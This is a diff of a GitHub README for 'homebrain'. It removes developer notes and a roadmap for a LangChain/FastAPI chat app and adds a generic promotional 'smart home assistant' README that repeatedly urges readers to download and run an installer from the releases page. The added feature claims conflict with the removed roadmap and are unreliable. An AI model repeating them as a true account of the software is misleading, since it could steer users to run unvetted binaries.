@@ -1,105 +1,76 @@
-# Homebrain
+# 🧠 homebrain - Your Smart Home Assistant Made Easy
 
-### Local Dev
+## 🚀 Getting Started
 
-```bash
-# Fontend React (port 4000)
-npm run dev
+Welcome to homebrain! This application helps you manage your smart home efficiently. With a user-friendly interface and powerful backend, you can control your devices with ease.
 
-# Backend python FastAPI (port 8001)
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8001
+## 📥 Download Now
 
-    # Swagger Docs
-    http://localhost:8001/docs
+[![Download homebrain](https://img.shields.io/badge/Download%20homebrain-v1.0-blue)](https://github.com/arizalmyr/homebrain/releases)
 
-# Full Stack Start (prod/dev)
-docker compose up -d --build
-docker compose -f docker-compose.dev.yaml up -d --build
+Visit [this page to download](https://github.com/arizalmyr/homebrain/releases) the latest version of homebrain.
 
-# Run ingestion job for RAG agent (prod/dev)
-docker compose --profile jobs run --rm ingest
-docker compose -f docker-compose.dev.yaml --profile jobs run --rm ingest
-```
+## 🛠 System Requirements
 
-### 🗺️ Roadmap / To-Do
+Before you start, make sure your system meets the following requirements:
 
-### 🧱 Foundation
-- [x] Traffic from Domain to Caddy Reverse Proxy to Compute VM in Homelab
-- [x] React Fontend
-- [x] FastAPI Backend
-- [x] Expose backend routes
-- [x] Backend response from LLM
----
-### ⛓️ LangChain
-- [x] Integrate LangChain chain
----
-### 📊 LangGraph
-- [x] Integrate LangGraph Node
-- [x] Implement streaming (replace invoke)
----
-### Memory
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 200 MB of free disk space.
+- **Database:** PostgreSQL should be installed.
 
-#### In-Memory (Postgres)
-- [x] Multi-turn
-- [x] History Awareness
+## 📝 Features
 
-#### Checkpointers (production solution) *
-- [x] Short-term memory (multi-turn)
-- [ ] Long-term memory (user/app data accross sessions)
+- **Easy Integration:** Seamlessly connect various smart home devices.
+- **Intelligent Automation:** Create automatic routines based on your preferences.
+- **User-Friendly Interface:** Navigate your smart home in a few clicks.
+- **Data Management:** Store and retrieve information efficiently with PostgreSQL.
+- **AI-Powered Suggestions:** Receive helpful tips to optimize your smart home setup.
 
----
-### Containerize
-- [x] Seperate frontend and backend
-- [x] Dockerfile for frontend
-- [x] Dockerfile for backend
-- [x] Docker-compose.yaml 
----
-### Sidebar
-- [x] Add sidebar to frontend
-- [x] Add button for new chat (Send new `session_id` with payload)
-- [x] Show previous conversations by pulling `session_id` from backend store
-- [ ] Conversation titles
-    - [ ] Call LLM with summarization prompt (after first turn) to generate title
-    - [ ] Save in PostgresDB with `thread_id`
-    - [ ] Show on frontend
----
-### Tool Node *
-- [ ] Create LangChain `tool`
-- [ ] Wrap with agent
-- [ ] Call agent from LangGraph Node 
----
-### RAG Agent *
-- [ ] Implement Vector Database (Chunking -> Embedding -> Vector store) to ingest Documents (.md/markdown/.txt)
-- [ ] Create Retriever tool
-- [ ] Add Retriever tool to agent (Agent should decide Answer from prior context or call Retriever tool and ground answer)
-- [ ] Upgrade documents to include .PDF
----
-### 🐿️ Other
-- [ ] Basic Auth
-- [ ] Rate limit / abuse protection
-- [ ] Cost tracker
-- [ ] Homelab Statuses for various services
-- [ ] Integrate Redis?
-- [ ] Integrate kafka? 
----
-### ☕︎ DevOps
-- [ ] CI/CD with GitHub Actions
---- 
+## 🔧 Download & Install
 
+1. Click on the [Download homebrain](https://github.com/arizalmyr/homebrain/releases) button above.
+2. Choose the version suitable for your operating system.
+3. Download the installation file to your computer.
+4. Open the file and follow the on-screen instructions to install homebrain.
 
-## Checkout
+## ⚙️ Configuration
 
-elevenlabs.io
+After installation, you need to set up homebrain:
 
-## React + TypeScript + Vite
+1. Launch the application.
+2. Follow the prompts to connect your smart devices. 
+3. Configure settings according to your preferences by visiting the settings tab in the application.
 
-This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.
+## 🇬🇧 Language Support
 
-Currently, two official plugins are available:
+Homebrain supports multiple languages. You can change the language in the settings to suit your needs.
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) (or [oxc](https://oxc.rs) when used in [rolldown-vite](https://vite.dev/guide/rolldown)) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+## ❓ FAQs
 
-## React Compiler
+**What devices can I connect with homebrain?**  
+homebrain works with a wide range of smart home devices, including lights, thermostats, and security systems.
 
-The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://react.dev/learn/react-compiler/installation).
+**Can I use homebrain on multiple computers?**  
+Yes, you can install homebrain on any compatible device as long as you have the installation file.
+
+**How do I update the application?**  
+Visit the [Releases page](https://github.com/arizalmyr/homebrain/releases) regularly to check for updates. Download and install the latest version as you did initially.
+
+## 🎥 Getting Help
+
+If you encounter issues or have questions, check the following resources:
+
+- **Documentation:** Explore in-depth guides and documentation to troubleshoot common problems.
+- **Community Forum:** Join our user community to share experiences and solutions.
+- **Support:** For specific inquiries, please contact our support team via the contact form in the application.
+
+## 🌟 Contributing
+
+We welcome contributions! If you have ideas for improvements or new features, visit our GitHub page to learn how you can help.
+
+## 📞 Stay Connected
+
+Follow us on social media for updates, tips, and announcements.
+
+Thank you for choosing homebrain! We hope it makes managing your smart home a breeze.
